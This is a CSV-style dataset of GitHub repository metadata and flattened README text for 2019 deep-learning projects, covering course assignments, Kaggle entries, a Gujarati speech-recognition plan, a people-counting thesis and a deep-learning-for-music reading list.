CUAI-Deeplearning,Keras-Deep-Learning-with-Python,n/a,Keras Deep Learning with Python 310 826 10 00 15 00 CHAPTER CHAPTER freethrow CHAPTER CHAPTER freethrow 1 2 3 4 5 6 7 8 1 1 kaggle competition,2019-10-06T09:30:37Z,2019-11-16T05:54:56Z,n/a,CUAI-Deeplearning,Organization,2,1,0,27,master,kkole3897#statslove#leeje008#alopui,4,0,0,0,0,0,0
SomyKamble,Iris_deep_learning_in_R,n/a,IrisdeeplearninginR,2019-10-31T08:38:59Z,2019-11-07T12:02:28Z,R,SomyKamble,User,1,1,0,2,master,SomyKamble,1,0,0,0,0,0,0
babankbro,Visual-Recognition-by-Deep-learning-,n/a,,2019-10-10T09:20:46Z,2019-10-17T07:22:03Z,Jupyter Notebook,babankbro,User,1,1,0,2,master,babankbro,1,0,0,0,0,0,0
xiaoyaowudi-extreme,deep_learning_blind_helping_robot,n/a,deeplearningblindhelpingrobot intstall instruction download the object detection folder and save here build make run make run,2019-10-04T14:25:44Z,2019-10-05T03:14:49Z,Python,xiaoyaowudi-extreme,User,1,1,0,0,master,,0,0,0,0,0,0,0
cfgt,start-deep-learning-in-golang,n/a,Getting Started with Deep Learning in Go This is meant to be a quick and simple resource to help jump start you into doing deep learning in Go Currently it includes one MNIST feedforward and one MNIST autoencoder example the hope is that this will help and inspire you to train and build more deep learning models in Go You can download the MNIST data at http yann lecun com exdb mnist Video The video for this talk is now available on YouTube at https www youtube com watch v LmWgBGqsfg,2019-10-31T04:33:02Z,2019-12-05T00:20:34Z,Go,cfgt,User,0,1,1,5,master,cfgt,1,0,0,0,0,0,0
petersontylerd,deep-learning-systems-fall-2019,n/a,deep learning systems fall 2019 Deep Learning Systems Fall 2019 course project repository,2019-10-02T15:54:10Z,2019-12-15T00:25:51Z,Jupyter Notebook,petersontylerd,User,2,1,0,17,master,petersontylerd#nchaudh03,2,0,0,0,0,0,0
paulinosalmon,CoE197DeepLearning,n/a,CoE197 Deep Learning Overall compilation of CoE197 Z Deep Learning codes,2019-10-12T03:46:26Z,2019-12-09T08:51:27Z,Jupyter Notebook,paulinosalmon,User,1,1,0,16,master,paulinosalmon,1,0,0,0,0,0,0
nextgrid,nextgrid.github.io,n/a,WARSAW DEEP LEARNING LABS S01E05 by Nextgrid ai Reinforcement learning OpenAI gym Stable baselines Tensorflow and Keras Warsaw Deep Learning Labs Episode 5 Here you will find instructions and relevant information for the event Don t hesitate to reach out organizers with any kind of questions Feel free to jump in on our event Slack channel https join slack com t warsawdeeplea lin3168 sharedinvite enQtODEyMjA1NTE1NjA3LWQ0Y2Q2OGUwNzBmMjljMDA1NGZmMWFmZTEzZWRkZjlkOTQ1YTQ4OTI4MzdhMDBmNjhmOWEyZDkzNDQ4MTQ5Njg where Marek M are avalible to answer questions and help out with issues Approach We believe that people learn best by actuall code grinding Today is the fifth mini hackaton event and the mission is to solve Bipedalwalker V2 Bipedalwalker Hardcore read docs at https stable baselines readthedocs io https stable baselines readthedocs io Technologies 1 Use technology of your coice 2 We recommend checking out https stable baselines readthedocs io https stable baselines readthedocs io Instructions 1 Work as a team pause for 5 min every 30 min to discuss current status what is being done and why it matters 2 Link to working model without parameters tweaked https colab research google com drive 12osEZByXOlGy8J MSpkl3faObhzPGIrB https colab research google com drive 12osEZByXOlGy8J MSpkl3faObhzPGIrB Material 1 https github com openai gym wiki BipedalWalker v2 https github com openai gym wiki BipedalWalker v2 2 https towardsdatascience com teach your ai how to walk 5ad55fce8bca https towardsdatascience com teach your ai how to walk 5ad55fce8bca 3 https gym openai com envs BipedalWalker v2 https gym openai com envs BipedalWalker v2 4 https github com openai gym wiki Leaderboard https github com openai gym wiki Leaderboard How we messure results https github com openai gym wiki Leaderboard https github com openai gym wiki Leaderboard,2019-09-20T12:45:33Z,2019-12-09T14:34:02Z,n/a,nextgrid,Organization,2,1,0,27,master,Mindgames#goalon,2,0,0,0,0,0,0
alexsvdk,DLSbot,n/a,,2019-10-18T06:39:50Z,2019-10-20T21:05:13Z,Kotlin,alexsvdk,User,1,1,0,6,master,alexsvdk,1,0,0,0,0,0,0
takytaky,RDL,n/a,RDL RDeepLearning,2019-10-13T04:37:29Z,2019-11-07T10:33:39Z,R,takytaky,User,1,1,0,2,master,takytaky,1,0,0,2,0,0,0
vistalab-technion,cs236781-tutorials,n/a,CS236781 Tutorials This repo contains the code and notebooks shown during course tutorials After a new tutorial is added you should run conda env update from the repo directory to update your dependencies since each new tutorial might add ones You can also view the tutorial notebooks in your browser using nbviewer by clicking the button below,2019-10-05T18:50:14Z,2019-12-05T09:17:47Z,Jupyter Notebook,vistalab-technion,Organization,1,1,1,140,master,avivrosenberg#chaimbaskin,2,0,0,0,0,0,0
MahmoudiHosni,CNN-Face-Detection,n/a,CNN Face Detection,2019-10-26T12:39:27Z,2019-10-28T19:58:55Z,Python,MahmoudiHosni,User,1,1,0,6,master,MahmoudiHosni,1,0,0,0,0,0,0
gurugio,dlfs,n/a,,2019-09-23T19:14:59Z,2019-10-26T15:33:03Z,Python,gurugio,User,1,1,1,4,master,gurugio,1,0,0,0,0,0,0
ineventhorizon,Perceptron-Algorithm-Python-DL,n/a,,2019-10-27T15:09:36Z,2019-10-28T14:07:05Z,Python,ineventhorizon,User,1,1,0,3,master,ineventhorizon,1,0,0,0,0,0,0
HerrMorozovDmitry,Neural-Networks,n/a,Neural Networks Projects Deep Learning Neural Networks,2019-09-25T11:49:07Z,2019-09-25T12:27:32Z,Python,HerrMorozovDmitry,User,1,1,0,4,master,HerrMorozovDmitry,1,0,0,0,0,0,0
benefice-bytes,DL,n/a,,2019-10-28T12:11:46Z,2019-11-08T03:45:15Z,Jupyter Notebook,benefice-bytes,User,1,1,0,2,master,benefice-bytes,1,0,0,0,0,0,0
dmadisetti,CS682,n/a,Using Unsupervised Learning in Classification for Autonomous Vehicles AKA see cars get money car bluecar taxi This project seeks to use SOTA unsupervised techniques to develop a competive pipeline for the PKU kaggle competition https www kaggle com c pku autonomous driving Usage This project is intended to be iterated up mainly on Google Colab As such refer to the example Example ipynb notebook for how to use this project Misc Keep it clean yapf p i r carsmoney test,2019-10-22T19:06:24Z,2019-12-13T20:18:46Z,Jupyter Notebook,dmadisetti,User,1,1,0,26,master,dmadisetti,1,4,4,3,0,0,4
tejasmagia,SpeechToText-DeepLearningESPNet-Indian-Gujarati-Voice,n/a,SpeechToText DeepLearningESPNet Indian Gujarati Voice This project has 2 parts to it 1 Data Creation for Model training 2 Using generated data implement Indian Gujarati ASR model Steps 1 Data Creation for Model training Project Completed Google Sppech2Text Gujarati Text conversion What we are doing I have used client Google Speech to Text api https cloud google com speech using following variation to find high accuracy of Gujarati text For running the conversion used google cloudspeechv1p1beta1 library using python language Speech Recognition for Indian Language Gujarati using google api Adjusting Audio speed playback speed Adjusting Audio Bit Rate Adjust different audio type like flac wav Adjust Audio slicing Detect and slice silence portion Adjust Rewind for Slicing audio Measured Accuracy To understand how much manual efforts will be required for user we have generated accuracy between Google generated text and manually corrected the google generated text by user The 30 mins audio file shows 69 accuracy which means to correct the 30 mins file user need to spend 3 4 hrs of manual efforts The attached excel file analysis was performed on Feb 2019 Currently if user listen to audio and type it on computer then 30 mins will take 6 hrs Attached 30 mins Audio Accuracy AnalysisFeb2019 xlsx For accessing google api and project used Google Id XXXXXXX gmail com Accuracy not Improving Recently we have started using google SpeechToText api where few audio text we have compared between Google generated text and User corrected google generated text which is as follows Attached Original File from Cloud Service txt Attached Manually corrected by User pdf In the above audio text speech starts from 00 03 22 00 03 48 timestamp onwards Step 2 Using ESPNet model implementing SpeechToText for Indian language Gujarati ASR Next Steps 1 Explore ESPnet https github com espnet espnet get it running on some local setup laptop 2 Confirm that our annotated Gujarati dataset can be converted to ESPnets data format 3 Identfiy other datasets which can be of help LibriSpeech Wall Street Journal etc What we need Automatic Speech Recognition ASR which works for Gujarati with some English spoken in Gujarati voice Word Error Rate WER needs to be at 15 or less ASR methods There are two distinct ways of doing it 1 Cascade Models a Acoustic Model converts audio inputs to individual phonemes b HMM model converts phonemes to characters with reps CCCCATTTTT instead of CAT c CTC Loss resolves repeating characters d Language Model makes sure that generated sentences are grammatical 2 End to End Models a single model which converts audio input to written sentences Cascade Models get better performance but have a lot more moving parts each of which requires effort Using them would need multiple people who have a lot of experience in AI We should not go for Cascade Models because we wont be able to track the effort End to End Models do get competitive performances and are much easier to handle Further since we have a very narrow domain one speaker one language the choice of method might not matter much End to End Models Some frameworks exist which are pretty good Of them ESPnet https github com espnet espnet is the one that was strongly suggested Data Just 10 hours of data in Gujarati is not enough data to train these models So the suggestion is to either 1 get a pretrained model trained on bigger public datasets and finetune them for our prupose 2 get hold of bigger public datsets ourselves to do the pretraining of the model a Wall Street Journal WSJ dataset https catalog ldc upenn edu LDC93S6A b LibriSpeech http www openslr org 12 c https towardsdatascience com a data lakes worth of audio datasets b45b88cd4ad,2019-10-20T18:07:34Z,2019-10-31T10:56:09Z,n/a,tejasmagia,User,1,1,0,3,master,tejasmagia,1,0,0,0,0,0,0
patrickaudriaz,DeepCounter,n/a,DeepCounter Bachelor Thesis Deep Learning to Detect Track and Count People in Video Sequences DEMO https youtu be DqEhZiMGvdc DeepCounter Detect Track and Count peoples OpenCV YOLO DeepCounter Detect Track and Count peoples OpenCV YOLO http img youtube com vi DqEhZiMGvdc 0 jpg Contexte Le projet s inscrit dans le projet de plus large envergure City Pulse https www smartlivinglab ch fr projects city pulse de l institut iCoSys https icosys ch de la HEIA FR https www heia fr ch et en partenariat avec le Smart Living Lab https www smartlivinglab ch fr Objectifs Les technologies bases sur le Deep Learning ont permis des avances importantes dans de nombreux domaines cognitifs Le but du projet est d intgrer une solution utilisant du Deep Learning pour compter le nombre de personnes qui passent dans le champ d une camra vido L architecture peut se dcomposer en un premier module qui dtecte pour chaque frame de la vido les personnes prsentes Le deuxime module prend en entre la sortie du premier pour compter sur la totalit de l enregistrement le nombre de personnes distinctes qui sont passes dans la scne Un point important du projet est la conception et mise en place d un systme d valuation des performances du projet Comme point de dpart des solutions comme YOLO pourront tre utilises En fonction des performances il faudra potentiellement entraner ou r entraner les systmes Deep Learning Un dmonstrateur serait souhait en fin de projet Auteur Patrick Audriaz https patrick audriaz com Superviseurs Jean Hennebert Houda Chabbi Experts Julien Bgard Emeka Mosanya Collaborateurs Flavia Pittet Matthieu Jourdan,2019-10-23T12:07:29Z,2019-10-25T20:40:42Z,Jupyter Notebook,patrickaudriaz,User,1,1,0,1,master,Jackeenn,1,0,0,0,0,0,0
davidsmiles,learningpython,n/a,,2019-09-27T23:24:48Z,2019-09-30T10:24:31Z,Python,davidsmiles,User,1,1,0,0,master,,0,0,0,0,0,0,0
xinthink,coursera-deeplearning,coursera#deep-learning#neural-network,Programming assignments of the Deep Learning Specialization on Coursera Directory Structure 01 nn 01 nn Assignments for course 1 5 Neural Networks and Deep Learning 02 dnn 02 dnn Assignments for course 2 5 Improving Deep Neural Networks Hyperparameter tuning Regularization and Optimization ipynb files are Jupyter Notebooks of the assignments py files are standalone code without documentation you can run debug Some of them are helper files Getting Started Setup a virtualenv Install Pipenv Install dependencies with pipenv install or specify your python location pipenv install python which python3 Now you can activate the virtualenv with pipenv shell or run python script directly by pipenv run python Running Notebooks python scripts pipenv run jupyter notebook then open a notebook or open a specified notebook pipenv run jupyter notebook 01 nn week02 week02 ipynb or run python scripts directly cd 01 nn week02 pipenv run python logisticregression py Coursera https www coursera org Deep Learning Specialization https www coursera org specializations deep learning Neural Networks and Deep Learning https www coursera org learn neural networks deep learning specialization deep learning Improving Deep Neural Networks Hyperparameter tuning Regularization and Optimization https www coursera org learn deep neural network specialization deep learning Pipenv https pipenv kennethreitz org,2019-10-17T03:01:56Z,2019-11-12T05:27:54Z,Jupyter Notebook,xinthink,User,1,1,0,19,master,xinthink,1,0,0,0,0,0,0
a8252525,deeplearning,n/a,Record of deep learning course in National Chiao Tung University,2019-09-28T09:36:32Z,2019-12-09T07:05:49Z,Jupyter Notebook,a8252525,User,1,1,0,29,master,a8252525,1,0,0,0,0,0,0
SomyKamble,Deep_learning_in_R_h2o,n/a,DeeplearninginRh2o,2019-10-11T21:23:25Z,2019-11-07T12:02:44Z,R,SomyKamble,User,1,1,0,2,master,SomyKamble,1,0,0,0,0,0,0
ghhernandes,cnn-multiclassifier-deeplearning,n/a,Deep Learning Multi Classifier with MNIST dataset MINST Deep Learning Multi Classifier with Tensorflow 2 0 and Keras Predict results https raw githubusercontent com ghhernandes mnist deeplearning master predict plot png,2019-10-09T01:41:06Z,2019-10-10T20:14:01Z,Jupyter Notebook,ghhernandes,User,1,1,0,3,master,ghhernandes,1,0,0,0,0,0,0
syedrafayhashmi,Introduction-to-Deep-Learning-with-PyTorch,n/a,Bertelsmann Tech Scholarship Challenge Course AI Track Nanodegree Program Course Link https www udacity com course deep learning pytorch ud188 GitHub Link of the course repository https github com udacity deep learning v2 pytorch,2019-09-24T16:14:20Z,2019-12-14T19:28:51Z,Jupyter Notebook,syedrafayhashmi,User,1,1,0,52,master,syedrafayhashmi,1,0,0,0,0,0,0
BalthasarSchachtner,radler,n/a,Run docker container docker run v realpath tf notebooks it p 8888 8888 gpus all balthasarschachtner radler v1 4 use password authentication instead of tokens write password to jupyter jupyternotebookconfig json e g using jupyter notebook password only works if you mount into the container Development resources https www tensorflow org install docker https github com tensorflow tensorflow blob master tensorflow tools dockerfiles dockerfiles gpu jupyter Dockerfile https hub docker com r tensorflow tensorflow,2019-10-16T11:55:20Z,2019-10-18T07:34:30Z,Dockerfile,BalthasarSchachtner,User,1,1,0,0,master,,0,0,4,0,0,0,0
ashishpatel26,Best-Audio-Classification-Resources-with-Deep-learning,article#audio#audio-classification#audio-processing#awesome#awesome-list#bib#deep-learning#deep-neural-networks#deeplearning#list#lists#machine-learning#music#music-genre-classification#music-information-retrieval#neural-network#neural-networks#resources#unicorns,Deep Learning for Music DL4M Awesome https cdn rawgit com sindresorhus awesome d7305f38d29fed78fa85652e3a63e154dd8e8829 media badge svg https github com sindresorhus awesome By Yann Bayle http yannbayle fr english index php Website http yannbayle fr english index php GitHub https github com ybayle from LaBRI Website http www labri fr Twitter https twitter com labriOfficial Univ Bordeaux Website https www u bordeaux fr Twitter https twitter com univbordeaux CNRS Website http www cnrs fr Twitter https twitter com CNRS and SCRIME Website https scrime u bordeaux fr TLDR Non exhaustive list of scientific articles on deep learning for music summary dl4m summary Article title pdf link and code details dl4m tsv table more info details dl4m bib bib all info The role of this curated list is to gather scientific articles thesis and reports that use deep learning approaches applied to music The list is currently under construction but feel free to contribute to the missing fields and to add other resources To do so please refer to the How To Contribute how to contribute section The resources provided here come from my review of the state of the art for my PhD Thesis for which an article is being written There are already surveys on deep learning for music generation https arxiv org pdf 1709 01620 pdf speech separation https arxiv org ftp arxiv papers 1708 1708 07524 pdf and speaker identification https www researchgate net profile SeyedRezaShahamiri publication 319158024SpeakerIdentificationFeaturesExtractionMethodsASystematicReview links 599e2816aca272dff12fdef1 Speaker Identification Features Extraction Methods A Systematic Review pdf However these surveys do not cover music information retrieval tasks that are included in this repository Table of contents DL4M summary dl4m summary DL4M details dl4m details Code without articles code without articles Statistics and visualisations statistics and visualisations Advices for reviewers of dl4m articles advices for reviewers of dl4m articles How To Contribute how to contribute FAQ faq Acronyms used acronyms used Sources sources Contributors contributors Other useful related lists other useful related lists and resources Cited by cited by License license DL4M summary Year Articles Thesis and Reports Code 1988 Neural net modeling of music No 1988 Creation by refinement A creativity paradigm for gradient descent learning networks http ieeexplore ieee org stamp stamp jsp arnumber 23933 No 1988 A sequential network design for musical applications No 1989 The representation of pitch in a neural net model of chord classification http www jstor org stable 3679550 No 1989 Algorithms for music composition by neural nets Improved CBR paradigms https quod lib umich edu cgi p pod dod idx algorithms for music composition pdf c icmcidno bbp2372 1989 044format pdf No 1989 A connectionist approach to algorithmic composition http www jstor org stable 3679551 No 1994 Neural network music composition by prediction Exploring the benefits of psychoacoustic constraints and multi scale processing http www labs iro umontreal ca pift6080 H09 documents papers mozer music pdf No 1995 Automatic source identification of monophonic musical instrument sounds https www researchgate net publication 3622871Automaticsourceidentificationofmonophonicmusicalinstrumentsounds No 1995 Neural network based model for classification of music type http ieeexplore ieee org abstract document 514161 No 1997 A machine learning approach to musical style recognition http repository cmu edu cgi viewcontent cgi article 1496 context compsci No 1998 Recognition of music types https www ri cmu edu pubfiles pub1 soltauhagen19982 soltauhagen19982 pdf No 1999 Musical networks Parallel distributed perception and performance https s3 amazonaws com academia edu documents 3551783 10 1 1 39 6248 pdf AWSAccessKeyId AKIAIWOWYYGZ2Y53UL3A Expires 1507055806 Signature 5mGzQc7bvJgUZYfXOmCX8eeNQOs 3D response content disposition inline 3B 20filename 3DMusicalnetworksParalleldistributedpe pdf No 2001 Multi phase learning for jazz improvisation and interaction http www cs smith edu jfrankli papers CtColl01 pdf No 2002 A supervised learning approach to musical style recognition https www researchgate net profile GiuseppeBuzzanca publication 228588086Asupervisedlearningapproachtomusicalstylerecognition links 54b43ee90cf26833efd0109f pdf No 2002 Finding temporal structure in music Blues improvisation with LSTM recurrent networks http www perso iro umontreal ca eckdoug papers 2002ieee pdf No 2002 Neural networks for note onset detection in piano music https www researchgate net profile MatijaMarolt publication 2473938NeuralNetworksforNoteOnsetDetectioninPianoMusic links 00b49525efccc79fed000000 pdf No 2004 A convolutional kernel based approach for note onset detection in piano solo audio signals http www murase nuie nagoya u ac jp ide res paper E04 conference pablo 1 pdf No 2009 Unsupervised feature learning for audio classification using convolutional deep belief networks http papers nips cc paper 3674 unsupervised feature learning for audio classification using convolutional deep belief networks pdf No 2010 Audio musical genre classification using convolutional neural networks and pitch and tempo transformations http lbms03 cityu edu hk theses cftt mphil cs b39478026f pdf No 2010 Automatic musical pattern feature extraction using convolutional neural network https www researchgate net profile AntoniChan2 publication 44260643AutomaticMusicalPatternFeatureExtractionUsingConvolutionalNeuralNetwork links 02e7e523dac6bb86b0000000 pdf No 2011 Audio based music classification with a pretrained convolutional network http www ismir2011 ismir net papers PS6 3 pdf No 2012 Rethinking automatic chord recognition with convolutional neural networks http ieeexplore ieee org abstract document 6406762 No 2012 Moving beyond feature design Deep architectures and automatic feature learning in music informatics http citeseerx ist psu edu viewdoc download doi 10 1 1 294 2304 rep rep1 type pdf No 2012 Local feature map integration using convolutional neural networks for music genre classification http liris cnrs fr Documents Liris 5602 pdf No 2012 Learning sparse feature representations for music annotation and retrieval https pdfs semanticscholar org 099d 85f25e9336f48ff64287a4b53ee5fb64ab51 pdf No 2012 Unsupervised learning of local features for music classification http www ismir2012 ismir net event papers 139ISMIR2012 pdf No 2013 Multiscale approaches to music audio feature learning http ismir2013 ismir net wp content uploads 2013 09 69Paper pdf No 2013 Musical onset detection with convolutional neural networks http phenicx upf edu system files publications SchlueterMML13 pdf No 2013 Deep content based music recommendation http papers nips cc paper 5004 deep content based music recommendation pdf No 2014 The munich LSTM RNN approach to the MediaEval 2014 Emotion In Music task https pdfs semanticscholar org 8a24 c5131d5a28165f719697028c34b00e6d3f60 pdf No 2014 End to end learning for music audio http ieeexplore ieee org abstract document 6854950 No 2014 Deep learning for music genre classification https courses engr illinois edu ece544na fa2014 TaoFeng pdf No 2014 Recognition of acoustic events using deep neural networks https www cs tut fi sgn arg music tuomasv dnneusipco2014 pdf No 2014 Deep image features in music information retrieval https www degruyter com downloadpdf j eletel 2014 60 issue 4 eletel 2014 0042 eletel 2014 0042 pdf No 2014 From music audio to chord tablature Teaching deep convolutional networks to play guitar http www mirlab org conferencepapers InternationalConference ICASSP 202014 papers p7024 humphrey pdf No 2014 Improved musical onset detection with convolutional neural networks http www mirlab org conferencepapers InternationalConference ICASSP 202014 papers p7029 schluter pdf No 2014 Boundary detection in music structure analysis using convolutional neural networks https dav grrrr org public pub ullrichschluetergrill 2014 ismir pdf No 2014 Improving content based and hybrid music recommendation using deep learning http www smcnus org wp content uploads 2014 08 recoMM14 pdf No 2014 A deep representation for invariance and music classification http www mirlab org conferencepapers InternationalConference ICASSP 202014 papers p7034 zhang pdf No 2015 Auralisation of deep convolutional neural networks Listening to learned features http ismir2015 uma es LBD LBD24 pdf GitHub https github com keunwoochoi Auralisation 2015 Downbeat tracking with multiple features and deep neural networks http perso telecom paristech fr grichard Publications 2015 durand icassp pdf No 2015 Music boundary detection using neural networks on spectrograms and self similarity lag matrices http www ofai at jan schlueter pubs 2015eusipco pdf No 2015 Classification of spatial audio location and content using convolutional neural networks https www researchgate net profile ToniHirvonen publication 276061831ClassificationofSpatialAudioLocationandContentUsingConvolutionalNeuralNetworks links 5550665908ae12808b37fe5a Classification of Spatial Audio Location and Content Using Convolutional Neural Networks pdf No 2015 Deep learning audio adversaries and music content analysis http www2 imm dtu dk pubdb views edocdownload php 6905 pdf imm6905 pdf No 2015 Deep learning and music adversaries https arxiv org pdf 1507 04761 pdf GitHub https github com coreyker dnn mgr 2015 Singing voice detection with deep recurrent neural networks https hal imt archives ouvertes fr hal 01110035 No 2015 Automatic instrument recognition in polyphonic music using convolutional neural networks https arxiv org pdf 1511 05520 pdf No 2015 A software framework for musical data augmentation https bmcfee github io papers ismir2015augmentation pdf No 2015 A deep bag of features model for music auto tagging https arxiv org pdf 1508 04999v1 pdf No 2015 Music noise segmentation in spectrotemporal domain using convolutional neural networks http ismir2015 uma es LBD LBD27 pdf No 2015 Musical instrument sound classification with deep convolutional neural network using feature fusion approach https arxiv org ftp arxiv papers 1512 1512 07370 pdf No 2015 Environmental sound classification with convolutional neural networks http karol piczak com papers Piczak2015 ESC ConvNet pdf No 2015 Exploring data augmentation for improved singing voice detection with neural networks https grrrr org pub schlueter 2015 ismir pdf GitHub https github com f0k ismir2015 2015 Singer traits identification using deep neural network https cs224d stanford edu reports SkiZhengshan pdf No 2015 A hybrid recurrent neural network for music transcription https arxiv org pdf 1411 1623 pdf No 2015 An end to end neural network for polyphonic music transcription https arxiv org pdf 1508 01774 pdf No 2015 Deep karaoke Extracting vocals from musical mixtures using a convolutional deep neural network https link springer com chapter 10 1007 978 3 319 22482 450 No 2015 Folk music style modelling by recurrent neural networks with long short term memory units http ismir2015 uma es LBD LBD13 pdf GitHub https github com IraKorshunova folk rnn 2015 Deep neural network based instrument extraction from music https www researchgate net profile StefanUhlich publication 282001406Deepneuralnetworkbasedinstrumentextractionfrommusic links 5600eeda08ae07629e52b397 Deep neural network based instrument extraction from music pdf No 2015 A deep neural network for modeling music https www researchgate net profile XiaoqingZheng3 publication 275347034ADeepNeuralNetworkforModelingMusic links 5539d2060cf2239f4e7dad0d A Deep Neural Network for Modeling Music pdf No 2016 An efficient approach for segmentation feature extraction and classification of audio signals http file scirp org pdf CS2016042615054817 pdf No 2016 Text based LSTM networks for automatic music composition https drive google com file d 0B1OooSxEtl0FcG9MYnY2Ylh5c0U view No 2016 Towards playlist generation algorithms using RNNs trained on within track transitions https arxiv org pdf 1606 02096 pdf No 2016 Automatic tagging using deep convolutional neural networks https arxiv org pdf 1606 00298 pdf No 2016 Automatic chord estimation on seventhsbass chord vocabulary using deep neural network http ieeexplore ieee org abstract document 7471677 No 2016 DeepBach A steerable model for Bach chorales generation https arxiv org pdf 1612 01010 pdf GitHub https github com Ghadjeres DeepBach 2016 Bayesian meter tracking on learned signal representations http www rhythmos org MMILab Andrefiles ISMIR2016CNNDBNbeatscamready pdf No 2016 Deep learning for music https arxiv org pdf 1606 04930 pdf No 2016 Learning temporal features using a deep neural network and its application to music genre classification https www researchgate net profile IlYoungJeong publication 305683876Learningtemporalfeaturesusingadeepneuralnetworkanditsapplicationtomusicgenreclassification links 5799a27c08aec89db7bb9f92 pdf No 2016 On the potential of simple framewise approaches to piano transcription https arxiv org pdf 1612 05153 pdf No 2016 Feature learning for chord recognition The deep chroma extractor https arxiv org pdf 1612 05065 pdf GitHub https github com fdlm chordrec tree master experiments ismir2016 2016 A fully convolutional deep auditory model for musical chord recognition https www researchgate net profile FilipKorzeniowski publication 305590295AFullyConvolutionalDeepAuditoryModelforMusicalChordRecognition links 579486ba08aed51475cc6958 A Fully Convolutional Deep Auditory Model for Musical Chord Recognition pdf iepl 5BhomeFeedViewId 5D HTzFFmKPia2YminQ4psHT5at iepl 5Bcontexts 5D 5B0 5D pcfhf iepl 5BinteractionType 5D publicationDownload origin publicationdetail ev pubintprwxdl msrp Dz6LKHzYcPyP LmgZPF m63ayZ6k0entFEntooiue32zfETNQXKPQSTFOI87NONIIQuUQdnUtwORdomTXfteTrb09KiAIdDtBJnw02P6JeRr5zu2eyaCG 2UxsieENxtbYL39lvorIK8LofRYhkgpUHzpzmVzkIEiyHc0wUY87rEa4PH1qbXi4k4RyagHUsA2IsZtewnprglORjx2v9Cwbk9ZfQ cd67BaqtHulhE6SX6vUFKuldz81aH6dWq cYMkq5vQKCHcvB8l9zgeM694Efbr2wBB5GT9idt3OLeME0UxVHI6ROxamgK3LMNlSw JtZXAo9HhR9t 8Wl3gxJgnoM4 rtmDEUDbXSWezbFyU CoBnyfxbRQ4kdoN4 5aJ3Tgx4YHdikicqAhccezB2ZntjxkB4rEDx1A No 2016 A deep bidirectional long short term memory based multi scale approach for music dynamic emotion prediction http ieeexplore ieee org document 7471734 No 2016 Event localization in music auto tagging http mac citi sinica edu tw yang pub liu16mm pdf GitHub https github com ciaua clip2frame 2016 Deep convolutional networks on the pitch spiral for musical instrument recognition https github com lostanlen ismir2016 blob master paper lostanlenismir2016 pdf GitHub https github com lostanlen ismir2016 2016 SampleRNN An unconditional end to end neural audio generation model https openreview net pdf id SkxKPDv5xl GitHub https github com soroushmehr sampleRNNICLR2017 2016 Robust audio event recognition with 1 max pooling convolutional neural networks https arxiv org ,2019-10-11T06:05:15Z,2019-12-06T10:49:01Z,TeX,ashishpatel26,User,1,1,0,106,master,ybayle#just1900#cprakashagr#devn#faroit#knstmrd#ironjr#sergiooramas#ssfrr,9,0,0,0,0,0,0
ashayaan,Deep-Learning-for-OR-and-FE,n/a,Deep Learning for OR and FE The repository contains the notes and the code for IEOR 4742 Deep Learning for OR and FE course at Columbia university offered in fall 2019,2019-09-21T03:49:49Z,2019-11-25T23:36:55Z,Jupyter Notebook,ashayaan,User,1,1,0,20,master,ashayaan,1,0,0,1,0,2,0
damiano9669,artificial_neural_networks_and_deep_learning,n/a,ARTIFICIAL NEURAL NETWORKS ANN and DEEP LEARNING During this university semester I have a course in Artificial Neural Networks and Deep Learning so I decided to create this project with the aim to help me in the understanding of this subject This can be an awesome opportunity to share my achievements with you Table of Contents In this project you can find three sub folders lessons lessons inside you can find the files of the lessons You can begin from the Introduction lessons introduction ipynb kaggleinclasscompetitions kaggleinclasscompetitions the directory contains my solutions adopted for the competitions spinoff spinoff in this directory I will insert some interesting codes to do some experiments with the main topics of the course They will be unordered and the prerequisites to understand what I will do won t follow the lessons of the other folder Damiano Derin,2019-09-28T08:34:31Z,2019-12-05T19:13:18Z,Jupyter Notebook,damiano9669,User,1,1,0,17,master,damiano9669,1,0,0,0,0,0,0
abhishekhanchate,Deep-Learning-for-detection-of-traffic-cones,n/a,Developed a CNN based algorithm to detect presence of a traffic cone in a given image Images Dataset Credits Team Autonobot Texas A M University Also part of a Kaggle challenge https www kaggle com c autonobot detection challenge 0 Dataset can be found in the above Kaggle link,2019-10-26T23:51:25Z,2019-12-13T19:02:15Z,Jupyter Notebook,abhishekhanchate,User,1,1,0,7,master,abhishekhanchate,1,0,0,0,0,0,0
JoaoPalmeira,Deep-Learning-Diagnostico-de-pneumonia-em-RX,n/a,,2019-09-26T13:39:54Z,2019-10-09T12:56:43Z,Python,JoaoPalmeira,User,1,1,0,3,master,JoaoPalmeira,1,0,0,0,0,0,0
AgrawalHimanshi,Neural-Networks-and-Deep-Learning-Coursera,n/a,,2019-10-01T19:28:08Z,2019-10-13T07:33:47Z,Jupyter Notebook,AgrawalHimanshi,User,1,1,0,3,master,AgrawalHimanshi,1,0,0,0,0,0,0
SaadAhmed-96,Keras-Python-Deep-Learning-Neural-Network-API,n/a,Keras Deep Learning Material Keras logo https s3 amazonaws com keras io img keras logo 2018 large 1200 png Keras is a high level neural networks API written in Python and capable of running on top of TensorFlow https github com tensorflow tensorflow CNTK https github com Microsoft cntk or Theano https github com Theano Theano It was developed with a focus on enabling fast experimentation Being able to go from idea to result with the least possible delay is key to doing good research Use Keras if you need a deep learning library that Allows for easy and fast prototyping through user friendliness modularity and extensibility Supports both convolutional networks and recurrent networks as well as combinations of the two Runs seamlessly on CPU and GPU Read the documentation at Keras io https keras io Keras is compatible with Python 2 7 3 6 How to install keras First install python3 7 using Anaconda second step is to run the command in annaconda CLI pip install keras third step to to run the command in annaconda CLI pip install tensorflow fourth step is to run the command in annaconda CLI pip install theano,2019-10-16T11:06:41Z,2019-11-06T19:40:26Z,Jupyter Notebook,SaadAhmed-96,User,1,1,0,1,master,SaadAhmed-96,1,0,0,0,0,0,0
hadibakalim,intro_to_deep_learning_with_PyTorch,n/a,introtodeeplearningwithPyTorch A course by Udacity,2019-10-14T15:47:01Z,2019-10-18T18:29:23Z,Jupyter Notebook,hadibakalim,User,1,1,0,9,master,hadibakalim,1,0,0,0,0,0,0
deepanshusadh,implementation-of-forward-propagation-deep-learning-,n/a,,2019-10-25T05:22:30Z,2019-10-25T05:23:28Z,Jupyter Notebook,deepanshusadh,User,1,1,0,1,master,deepanshusadh,1,0,0,0,0,0,0
